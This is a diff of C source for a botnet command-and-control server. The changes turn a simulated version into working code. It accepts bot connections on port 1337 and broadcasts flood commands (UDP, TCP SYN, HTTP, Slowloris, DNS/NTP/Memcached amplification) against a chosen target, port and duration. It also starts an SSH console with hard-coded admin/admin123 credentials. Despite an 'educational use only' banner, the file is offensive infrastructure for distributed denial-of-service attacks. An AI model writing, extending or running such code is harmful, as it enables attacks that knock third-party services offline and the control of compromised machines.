@@ -7,206 +7,378 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
+#include <signal.h>
+#include <dirent.h>
+#include <sys/stat.h>
+
 #include "ascii_art.h"
+#include "network_utils.h"
+#include "ssh_service.h"
 
 #define CNC_PORT 1337
 #define MAX_BOTS 1000
-#define MAX_ATTACKS 10
+#define MAX_ATTACKS 50
+#define MAX_CMD_SIZE 1024
 
+// Bot structure
 typedef struct {
     char id[20];
     char ip[16];
     int port;
     time_t last_seen;
+    int socket_fd;
     int active;
+    pthread_t thread_id;
 } bot_t;
 
+// Attack structure
 typedef struct {
     int id;
     char method[50];
     char target[256];
     int port;
     int duration;
+    int threads;
     time_t start_time;
     int active;
+    int bot_count;
 } attack_t;
 
+// Global variables
 bot_t bots[MAX_BOTS];
 attack_t attacks[MAX_ATTACKS];
 int bot_count = 0;
 int attack_count = 0;
+int cnc_running = 1;
+pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
+pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;
 
-void clear_screen() {
-    printf("\033[2J\033[1;1H");
+// Function prototypes
+void* handle_bot_connection(void* socket_ptr);
+void* attack_monitor_thread(void* arg);
+void print_cnc_status();
+void print_connected_bots();
+void print_active_attacks();
+void start_attack_command(char* command);
+void stop_attack_command(int attack_id);
+void stop_all_attacks();
+void save_attack_log(const char* method, const char* target, int port, int duration, int threads);
+void load_attack_history();
+
+void signal_handler(int sig) {
+    printf("\n\033[1;33m[*] Shutting down C&C server...\033[0m\n");
+    cnc_running = 0;
 }
 
-void print_menu() {
-    printf("\033[1;34m");
-    printf("╔════════════════════════════════════════════════════════════════╗\n");
-    printf("║                         COMMAND MENU                           ║\n");
-    printf("╠════════════════════════════════════════════════════════════════╣\n");
-    printf("║  help                    - Show this menu                      ║\n");
-    printf("║  list bots               - List connected bots                 ║\n");
-    printf("║  list attacks            - Show active attacks                 ║\n");
-    printf("║  attack <method> <target> <port> <time> <threads>              ║\n");
-    printf("║  stop <attack_id>        - Stop specific attack                ║\n");
-    printf("║  stop all                - Stop all attacks                    ║\n");
-    printf("║  methods                 - Show available attack methods       ║\n");
-    printf("║  clear                   - Clear screen                        ║\n");
-    printf("║  exit                    - Exit C&C server                     ║\n");
-    printf("╚════════════════════════════════════════════════════════════════╝\n");
-    printf("\033[0m\n");
-}
-
-void print_methods() {
+void print_cnc_status() {
     printf("\033[1;36m");
-    printf("┌───────────────────── AVAILABLE METHODS ───────────────────────┐\n");
-    printf("│ UDP-FLOOD        - UDP flood using connected sockets          │\n");
-    printf("│ UDP-RAW          - UDP flood using raw sockets                │\n");
-    printf("│ TCP-SYN          - TCP SYN flood                              │\n");
-    printf("│ HTTP-FLOOD       - HTTP/HTTPS request flood                   │\n");
-    printf("│ SLOWLORIS        - Slowloris attack                           │\n");
-    printf("│ ICMP-FLOOD       - ICMP ping flood                            │\n");
-    printf("│ DNS-AMP          - DNS amplification attack                   │\n");
-    printf("│ NTP-AMP          - NTP amplification attack                   │\n");
-    printf("│ SSDP-AMP         - SSDP amplification attack                  │\n");
-    printf("│ MEMCACHED-AMP    - Memcached amplification attack             │\n");
+    printf("┌────────────────────── C&C SERVER STATUS ──────────────────────┐\n");
+    printf("│ Running Time:    %-40s │\n", ctime(&(time_t){time(NULL)}));
+    printf("│ Connected Bots:  %-40d │\n", bot_count);
+    printf("│ Active Attacks:  %-40d │\n", attack_count);
+    printf("│ C&C Port:        %-40d │\n", CNC_PORT);
+    printf("│ SSH Port:        %-40d │\n", SSH_PORT);
+    printf("│ Total Attacks:   %-40d │\n", attack_count);
     printf("└────────────────────────────────────────────────────────────────┘\n");
     printf("\033[0m");
 }
 
-void print_attack_details(const char* method, const char* target, int port, int duration, int threads) {
+void print_connected_bots() {
+    pthread_mutex_lock(&bot_mutex);
+    
+    printf("\033[1;35m");
+    printf("┌────────────────────── CONNECTED BOTS ─────────────────────────┐\n");
+    if (bot_count == 0) {
+        printf("│ No bots connected                                            │\n");
+    } else {
+        printf("│ ID         IP Address       Port    Last Seen               │\n");
+        printf("├────────────────────────────────────────────────────────────────┤\n");
+        for (int i = 0; i < bot_count; i++) {
+            if (bots[i].active) {
+                char time_str[20];
+                strftime(time_str, sizeof(time_str), "%H:%M:%S %Y-%m-%d", 
+                        localtime(&bots[i].last_seen));
+                printf("│ %-10s %-15s %-6d %-20s │\n", 
+                       bots[i].id, bots[i].ip, bots[i].port, time_str);
+            }
+        }
+    }
+    printf("└────────────────────────────────────────────────────────────────┘\n");
+    printf("\033[0m");
+    
+    pthread_mutex_unlock(&bot_mutex);
+}
+
+void print_active_attacks() {
+    pthread_mutex_lock(&attack_mutex);
+    
     printf("\033[1;33m");
-    printf("┌───────────────────── ATTACK DETAILS ──────────────────────────┐\n");
-    printf("│ Method:    %-45s │\n", method);
-    printf("│ Target:    %-45s │\n", target);
-    printf("│ Port:      %-45d │\n", port);
-    printf("│ Duration:  %-45d │\n", duration);
-    printf("│ Threads:   %-45d │\n", threads);
-    printf("│ Start:     %-45s │\n", ctime(&(time_t){time(NULL)}));
+    printf("┌────────────────────── ACTIVE ATTACKS ─────────────────────────┐\n");
+    if (attack_count == 0) {
+        printf("│ No active attacks                                            │\n");
+    } else {
+        printf("│ ID  Method       Target            Port  Time   Threads     │\n");
+        printf("├────────────────────────────────────────────────────────────────┤\n");
+        for (int i = 0; i < attack_count; i++) {
+            if (attacks[i].active) {
+                int elapsed = time(NULL) - attacks[i].start_time;
+                int remaining = attacks[i].duration - elapsed;
+                if (remaining < 0) remaining = 0;
+                
+                printf("│ %-3d %-11s %-16s %-5d %-6d %-10d │\n", 
+                       attacks[i].id, attacks[i].method, attacks[i].target, 
+                       attacks[i].port, remaining, attacks[i].threads);
+            }
+        }
+    }
     printf("└────────────────────────────────────────────────────────────────┘\n");
     printf("\033[0m");
+    
+    pthread_mutex_unlock(&attack_mutex);
 }
 
-void* bot_handler(void* socket_ptr) {
-    int sockfd = *(int*)socket_ptr;
-    char buffer[1024];
-    struct sockaddr_in client_addr;
-    socklen_t addr_len = sizeof(client_addr);
+void add_bot(int socket_fd, struct sockaddr_in client_addr) {
+    pthread_mutex_lock(&bot_mutex);
     
-    getpeername(sockfd, (struct sockaddr*)&client_addr, &addr_len);
-    
-    // Add bot to list
-    if(bot_count < MAX_BOTS) {
-        strcpy(bots[bot_count].ip, inet_ntoa(client_addr.sin_addr));
-        bots[bot_count].port = ntohs(client_addr.sin_port);
-        snprintf(bots[bot_count].id, sizeof(bots[bot_count].id), "BOT-%03d", bot_count);
-        bots[bot_count].last_seen = time(NULL);
-        bots[bot_count].active = 1;
-        bot_count++;
+    if (bot_count < MAX_BOTS) {
+        // Find inactive slot or create new
+        int slot = -1;
+        for (int i = 0; i < bot_count; i++) {
+            if (!bots[i].active) {
+                slot = i;
+                break;
+            }
+        }
+        if (slot == -1) {
+            slot = bot_count;
+            bot_count++;
+        }
         
-        printf("\033[1;32m[+] Bot connected: %s (%s:%d)\033[0m\n", 
-               bots[bot_count-1].id, bots[bot_count-1].ip, bots[bot_count-1].port);
+        // Initialize bot
+        bots[slot].socket_fd = socket_fd;
+        strcpy(bots[slot].ip, inet_ntoa(client_addr.sin_addr));
+        bots[slot].port = ntohs(client_addr.sin_port);
+        bots[slot].last_seen = time(NULL);
+        bots[slot].active = 1;
+        snprintf(bots[slot].id, sizeof(bots[slot].id), "BOT-%03d", slot + 1);
+        
+        printf("\033[1;32m[+] Bot connected: %s from %s:%d\033[0m\n", 
+               bots[slot].id, bots[slot].ip, bots[slot].port);
+    } else {
+        printf("\033[1;31m[!] Maximum bot capacity reached\033[0m\n");
+        close(socket_fd);
     }
     
-    while(1) {
-        int bytes = recv(sockfd, buffer, sizeof(buffer)-1, 0);
-        if(bytes <= 0) break;
-        
-        buffer[bytes] = 0;
-        printf("Bot %s: %s\n", bots[bot_count-1].id, buffer);
-        
-        // Handle bot responses
-        if(strstr(buffer, "ATTACK_STARTED")) {
-            printf("\033[1;32m[+] Attack started successfully\033[0m\n");
+    pthread_mutex_unlock(&bot_mutex);
+}
+
+void remove_bot(int socket_fd) {
+    pthread_mutex_lock(&bot_mutex);
+    
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].socket_fd == socket_fd && bots[i].active) {
+            printf("\033[1;31m[-] Bot disconnected: %s from %s:%d\033[0m\n", 
+                   bots[i].id, bots[i].ip, bots[i].port);
+            bots[i].active = 0;
+            close(socket_fd);
+            break;
         }
     }
     
-    close(sockfd);
+    pthread_mutex_unlock(&bot_mutex);
+}
+
+void send_to_bot(int bot_index, const char* message) {
+    if (bot_index >= 0 && bot_index < bot_count && bots[bot_index].active) {
+        send(bots[bot_index].socket_fd, message, strlen(message), 0);
+    }
+}
+
+void broadcast_to_bots(const char* message) {
+    pthread_mutex_lock(&bot_mutex);
+    
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].active) {
+            send(bots[i].socket_fd, message, strlen(message), 0);
+        }
+    }
+    
+    pthread_mutex_unlock(&bot_mutex);
+}
+
+void start_attack_command(char* command) {
+    char method[50], target[256];
+    int port, duration, threads;
+    
+    if (sscanf(command, "attack %49s %255s %d %d %d", 
+               method, target, &port, &duration, &threads) == 5) {
+        
+        pthread_mutex_lock(&attack_mutex);
+        
+        if (attack_count < MAX_ATTACKS) {
+            attacks[attack_count].id = attack_count + 1;
+            strcpy(attacks[attack_count].method, method);
+            strcpy(attacks[attack_count].target, target);
+            attacks[attack_count].port = port;
+            attacks[attack_count].duration = duration;
+            attacks[attack_count].threads = threads;
+            attacks[attack_count].start_time = time(NULL);
+            attacks[attack_count].active = 1;
+            attacks[attack_count].bot_count = bot_count;
+            
+            // Build attack command for bots
+            char attack_cmd[MAX_CMD_SIZE];
+            snprintf(attack_cmd, sizeof(attack_cmd), "ATTACK %s %s %d %d %d", 
+                    method, target, port, duration, threads);
+            
+            // Send to all bots
+            broadcast_to_bots(attack_cmd);
+            
+            // Log the attack
+            save_attack_log(method, target, port, duration, threads);
+            
+            printf("\033[1;32m[+] Attack #%d started: %s on %s:%d for %d seconds with %d threads\033[0m\n",
+                   attacks[attack_count].id, method, target, port, duration, threads);
+            
+            attack_count++;
+        } else {
+            printf("\033[1;31m[!] Maximum attack capacity reached\033[0m\n");
+        }
+        
+        pthread_mutex_unlock(&attack_mutex);
+    } else {
+        printf("\033[1;31m[!] Invalid attack command format\033[0m\n");
+        printf("Usage: attack <method> <target> <port> <time> <threads>\n");
+    }
+}
+
+void stop_attack_command(int attack_id) {
+    pthread_mutex_lock(&attack_mutex);
+    
+    int found = 0;
+    for (int i = 0; i < attack_count; i++) {
+        if (attacks[i].id == attack_id && attacks[i].active) {
+            attacks[i].active = 0;
+            broadcast_to_bots("STOP");
+            printf("\033[1;33m[+] Stopped attack #%d\033[0m\n", attack_id);
+            found = 1;
+            break;
+        }
+    }
+    
+    if (!found) {
+        printf("\033[1;31m[!] Attack #%d not found or already stopped\033[0m\n", attack_id);
+    }
+    
+    pthread_mutex_unlock(&attack_mutex);
+}
+
+void stop_all_attacks() {
+    pthread_mutex_lock(&attack_mutex);
+    
+    for (int i = 0; i < attack_count; i++) {
+        if (attacks[i].active) {
+            attacks[i].active = 0;
+        }
+    }
+    
+    broadcast_to_bots("STOP_ALL");
+    printf("\033[1;33m[+] All attacks stopped\033[0m\n");
+    
+    pthread_mutex_unlock(&attack_mutex);
+}
+
+void save_attack_log(const char* method, const char* target, int port, int duration, int threads) {
+    FILE* log_file = fopen("attack_log.txt", "a");
+    if (log_file) {
+        time_t now = time(NULL);
+        fprintf(log_file, "[%s] %s %s:%d %ds %d threads\n", 
+                ctime(&now), method, target, port, duration, threads);
+        fclose(log_file);
+    }
+}
+
+void load_attack_history() {
+    FILE* log_file = fopen("attack_log.txt", "r");
+    if (log_file) {
+        printf("\033[1;36m[*] Loading attack history...\033[0m\n");
+        fclose(log_file);
+    }
+}
+
+void* attack_monitor_thread(void* arg) {
+    while (cnc_running) {
+        pthread_mutex_lock(&attack_mutex);
+        
+        time_t current_time = time(NULL);
+        for (int i = 0; i < attack_count; i++) {
+            if (attacks[i].active) {
+                int elapsed = current_time - attacks[i].start_time;
+                if (elapsed >= attacks[i].duration) {
+                    printf("\033[1;32m[+] Attack #%d completed automatically\033[0m\n", attacks[i].id);
+                    attacks[i].active = 0;
+                }
+            }
+        }
+        
+        pthread_mutex_unlock(&attack_mutex);
+        sleep(1);
+    }
     return NULL;
 }
 
-void start_attack(const char* method, const char* target, int port, int duration, int threads) {
-    if(attack_count >= MAX_ATTACKS) {
-        printf("Maximum number of attacks reached!\n");
-        return;
-    }
+void* handle_bot_connection(void* socket_ptr) {
+    int socket_fd = *(int*)socket_ptr;
+    struct sockaddr_in client_addr;
+    socklen_t addr_len = sizeof(client_addr);
     
-    attacks[attack_count].id = attack_count + 1;
-    strcpy(attacks[attack_count].method, method);
-    strcpy(attacks[attack_count].target, target);
-    attacks[attack_count].port = port;
-    attacks[attack_count].duration = duration;
-    attacks[attack_count].start_time = time(NULL);
-    attacks[attack_count].active = 1;
+    getpeername(socket_fd, (struct sockaddr*)&client_addr, &addr_len);
+    add_bot(socket_fd, client_addr);
     
-    print_attack_details(method, target, port, duration, threads);
-    print_loading(2);
-    
-    // Simulate sending attack command to bots
-    printf("\033[1;35m[*] Sending attack command to %d bots...\033[0m\n", bot_count);
-    
-    attack_count++;
-    print_success();
-}
-
-void list_bots() {
-    printf("\033[1;36m");
-    printf("┌────────────────────── CONNECTED BOTS ─────────────────────────┐\n");
-    if(bot_count == 0) {
-        printf("│ No bots connected                                            │\n");
-    } else {
-        for(int i = 0; i < bot_count; i++) {
-            if(bots[i].active) {
-                printf("│ %-8s %-15s %-6d %-20s │\n", 
-                       bots[i].id, bots[i].ip, bots[i].port, 
-                       ctime(&bots[i].last_seen));
+    char buffer[MAX_CMD_SIZE];
+    while (cnc_running) {
+        int bytes_received = recv(socket_fd, buffer, sizeof(buffer) - 1, 0);
+        if (bytes_received <= 0) {
+            break;
+        }
+        
+        buffer[bytes_received] = '\0';
+        
+        // Update bot last seen time
+        pthread_mutex_lock(&bot_mutex);
+        for (int i = 0; i < bot_count; i++) {
+            if (bots[i].socket_fd == socket_fd && bots[i].active) {
+                bots[i].last_seen = time(NULL);
+                break;
             }
         }
-    }
-    printf("└────────────────────────────────────────────────────────────────┘\n");
-    printf("\033[0m");
-}
-
-void list_attacks() {
-    printf("\033[1;33m");
-    printf("┌────────────────────── ACTIVE ATTACKS ─────────────────────────┐\n");
-    if(attack_count == 0) {
-        printf("│ No active attacks                                            │\n");
-    } else {
-        for(int i = 0; i < attack_count; i++) {
-            if(attacks[i].active) {
-                int elapsed = time(NULL) - attacks[i].start_time;
-                int remaining = attacks[i].duration - elapsed;
-                printf("│ #%-2d %-12s %-20s %-4d %3d/%3ds │\n", 
-                       attacks[i].id, attacks[i].method, attacks[i].target, 
-                       attacks[i].port, elapsed, attacks[i].duration);
-            }
+        pthread_mutex_unlock(&bot_mutex);
+        
+        // Process bot messages
+        if (strstr(buffer, "STATUS:")) {
+            printf("Bot status: %s\n", buffer);
         }
     }
-    printf("└────────────────────────────────────────────────────────────────┘\n");
-    printf("\033[0m");
+    
+    remove_bot(socket_fd);
+    return NULL;
 }
 
-int main() {
+void* cnc_bot_listener(void* arg) {
     int server_fd, new_socket;
     struct sockaddr_in address;
     int opt = 1;
     
-    clear_screen();
-    print_banner();
-    print_loading(3);
-    
     // Create socket
-    if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
-        perror("socket failed");
-        exit(EXIT_FAILURE);
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
+        perror("Socket creation failed");
+        return NULL;
     }
     
     // Set socket options
-    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
-        perror("setsockopt");
-        exit(EXIT_FAILURE);
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
+        perror("Setsockopt failed");
+        return NULL;
     }
     
     address.sin_family = AF_INET;
@@ -214,69 +386,212 @@ int main() {
     address.sin_port = htons(CNC_PORT);
     
     // Bind socket
-    if(bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
-        perror("bind failed");
-        exit(EXIT_FAILURE);
+    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
+        perror("Bind failed");
+        return NULL;
     }
     
     // Listen for connections
-    if(listen(server_fd, 10) < 0) {
-        perror("listen");
-        exit(EXIT_FAILURE);
+    if (listen(server_fd, 10) < 0) {
+        perror("Listen failed");
+        return NULL;
     }
     
-    printf("\033[1;32m[+] C&C Server started on port %d\033[0m\n", CNC_PORT);
+    printf("\033[1;32m[+] C&C Bot listener started on port %d\033[0m\n", CNC_PORT);
     
-    // Accept connections in separate thread
-    pthread_t accept_thread;
-    // ... (accept thread implementation)
-    
-    // Main command loop
-    char command[256];
-    while(1) {
-        printf("\033[1;35mC&C>\033[0m ");
-        fflush(stdout);
-        
-        if(fgets(command, sizeof(command), stdin) == NULL) break;
-        
-        command[strcspn(command, "\n")] = 0; // Remove newline
-        
-        if(strcmp(command, "help") == 0) {
-            print_menu();
-        }
-        else if(strcmp(command, "methods") == 0) {
-            print_methods();
-        }
-        else if(strcmp(command, "list bots") == 0) {
-            list_bots();
-        }
-        else if(strcmp(command, "list attacks") == 0) {
-            list_attacks();
-        }
-        else if(strcmp(command, "clear") == 0) {
-            clear_screen();
-            print_banner();
-        }
-        else if(strncmp(command, "attack ", 7) == 0) {
-            char method[50], target[256];
-            int port, duration, threads;
-            
-            if(sscanf(command, "attack %49s %255s %d %d %d", 
-                      method, target, &port, &duration, &threads) == 5) {
-                start_attack(method, target, port, duration, threads);
-            } else {
-                printf("Usage: attack <method> <target> <port> <duration> <threads>\n");
+    while (cnc_running) {
+        int client_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&address);
+        if (client_socket < 0) {
+            if (cnc_running) {
+                perror("Accept failed");
             }
+            continue;
         }
-        else if(strcmp(command, "exit") == 0) {
-            printf("Shutting down C&C server...\n");
-            break;
-        }
-        else if(strlen(command) > 0) {
-            printf("Unknown command. Type 'help' for available commands.\n");
-        }
+        
+        // Handle each bot connection in a separate thread
+        pthread_t bot_thread;
+        int* new_sock = malloc(sizeof(int));
+        *new_sock = client_socket;
+        
+        pthread_create(&bot_thread, NULL, handle_bot_connection, new_sock);
+        pthread_detach(bot_thread);
     }
     
     close(server_fd);
+    return NULL;
+}
+
+void start_ssh_in_thread() {
+    pthread_t ssh_thread;
+    pthread_create(&ssh_thread, NULL, (void*)start_ssh_service, NULL);
+    printf("\033[1;32m[+] SSH service starting on port %d...\033[0m\n", SSH_PORT);
+}
+
+void print_welcome_message() {
+    printf("\033[1;35m");
+    printf("╔════════════════════════════════════════════════════════════════╗\n");
+    printf("║                   BOTNET C&C SERVER v2.0                       ║\n");
+    printf("║                     EDUCATIONAL USE ONLY                       ║\n");
+    printf("║                      YOUR SERVERS ONLY                         ║\n");
+    printf("║                                                                ║\n");
+    printf("║                    Server Initialized                          ║\n");
+    printf("║                 Ready for connections...                       ║\n");
+    printf("╚════════════════════════════════════════════════════════════════╝\n");
+    printf("\033[0m");
+}
+
+void print_help() {
+    printf("\033[1;36m");
+    printf("┌────────────────────── C&C COMMANDS ───────────────────────────┐\n");
+    printf("│ help                    - Show this help message              │\n");
+    printf("│ status                  - Show server status                  │\n");
+    printf("│ bots                    - List connected bots                 │\n");
+    printf("│ attacks                 - Show active attacks                 │\n");
+    printf("│ attack <method> <target> <port> <time> <threads>              │\n");
+    printf("│                         - Start an attack                     │\n");
+    printf("│ stop <id>               - Stop specific attack                │\n");
+    printf("│ stop all                - Stop all attacks                    │\n");
+    printf("│ methods                 - Show available methods              │\n");
+    printf("│ clear                   - Clear screen                        │\n");
+    printf("│ exit                    - Shutdown server                     │\n");
+    printf("└────────────────────────────────────────────────────────────────┘\n");
+    printf("\033[0m");
+}
+
+void print_methods() {
+    printf("\033[1;33m");
+    printf("┌───────────────────── ATTACK METHODS ──────────────────────────┐\n");
+    printf("│ UDP-FLOOD        - UDP flood using connected sockets          │\n");
+    printf("│ UDP-RAW          - UDP flood using raw sockets                │\n");
+    printf("│ TCP-SYN          - TCP SYN flood                              │\n");
+    printf("│ TCP-ACK          - TCP ACK flood                              │\n");
+    printf("│ HTTP-FLOOD       - HTTP/HTTPS request flood                   │\n");
+    printf("│ SLOWLORIS        - Slowloris attack                           │\n");
+    printf("│ ICMP-FLOOD       - ICMP ping flood                            │\n");
+    printf("│ DNS-AMP          - DNS amplification attack                   │\n");
+    printf("│ NTP-AMP          - NTP amplification attack                   │\n");
+    printf("│ MEMCACHED-AMP    - Memcached amplification attack             │\n");
+    printf("└────────────────────────────────────────────────────────────────┘\n");
+    printf("\033[0m");
+}
+
+void command_interface() {
+    char command[MAX_CMD_SIZE];
+    
+    while (cnc_running) {
+        printf("\033[1;35mC&C>\033[0m ");
+        fflush(stdout);
+        
+        if (fgets(command, sizeof(command), stdin) == NULL) {
+            break;
+        }
+        
+        // Remove newline
+        command[strcspn(command, "\n")] = 0;
+        
+        if (strcmp(command, "help") == 0) {
+            print_help();
+        }
+        else if (strcmp(command, "status") == 0) {
+            print_cnc_status();
+        }
+        else if (strcmp(command, "bots") == 0) {
+            print_connected_bots();
+        }
+        else if (strcmp(command, "attacks") == 0) {
+            print_active_attacks();
+        }
+        else if (strncmp(command, "attack ", 7) == 0) {
+            start_attack_command(command);
+        }
+        else if (strncmp(command, "stop ", 5) == 0) {
+            int attack_id;
+            if (sscanf(command, "stop %d", &attack_id) == 1) {
+                stop_attack_command(attack_id);
+            } else {
+                printf("\033[1;31m[!] Usage: stop <attack_id>\033[0m\n");
+            }
+        }
+        else if (strcmp(command, "stop all") == 0) {
+            stop_all_attacks();
+        }
+        else if (strcmp(command, "methods") == 0) {
+            print_methods();
+        }
+        else if (strcmp(command, "clear") == 0) {
+            printf("\033[2J\033[1;1H");
+            print_welcome_message();
+        }
+        else if (strcmp(command, "exit") == 0) {
+            printf("\033[1;33m[*] Shutting down C&C server...\033[0m\n");
+            cnc_running = 0;
+            break;
+        }
+        else if (strlen(command) > 0) {
+            printf("\033[1;31m[!] Unknown command: %s\033[0m\n", command);
+            printf("Type 'help' for available commands.\n");
+        }
+    }
+}
+
+int main() {
+    // Set signal handlers
+    signal(SIGINT, signal_handler);
+    signal(SIGTERM, signal_handler);
+    
+    // Show banner and initialize
+    print_banner();
+    printf("\033[1;33m[*] Initializing C&C Server...\033[0m\n");
+    print_loading(3);
+    
+    // Load attack history
+    load_attack_history();
+    
+    // Start SSH service
+    start_ssh_in_thread();
+    
+    // Start attack monitor thread
+    pthread_t monitor_thread;
+    pthread_create(&monitor_thread, NULL, attack_monitor_thread, NULL);
+    pthread_detach(monitor_thread);
+    
+    // Start bot listener in separate thread
+    pthread_t listener_thread;
+    pthread_create(&listener_thread, NULL, cnc_bot_listener, NULL);
+    
+    // Wait a moment for services to start
+    sleep(2);
+    
+    // Show welcome message
+    print_welcome_message();
+    print_cnc_status();
+    
+    printf("\033[1;35m[+] C&C Server fully operational!\033[0m\n");
+    printf("\033[1;36m[+] Bot connections on port: %d\033[0m\n", CNC_PORT);
+    printf("\033[1;36m[+] SSH access on port: %d\033[0m\n", SSH_PORT);
+    printf("\033[1;33m[+] SSH Credentials: admin/admin123 or user/user123\033[0m\n");
+    printf("\033[1;32m[+] Connect with: ssh -p %d admin@<server_ip>\033[0m\n", SSH_PORT);
+    printf("\033[1;32m[+] Or use Putty to connect to port %d\033[0m\n\n", SSH_PORT);
+    
+    // Start command interface
+    command_interface();
+    
+    // Cleanup
+    printf("\033[1;33m[*] Cleaning up...\033[0m\n");
+    
+    // Stop all attacks
+    stop_all_attacks();
+    
+    // Close all bot connections
+    pthread_mutex_lock(&bot_mutex);
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].active) {
+            close(bots[i].socket_fd);
+            bots[i].active = 0;
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    
+    printf("\033[1;32m[+] C&C Server shutdown complete\033[0m\n");
     return 0;
 }
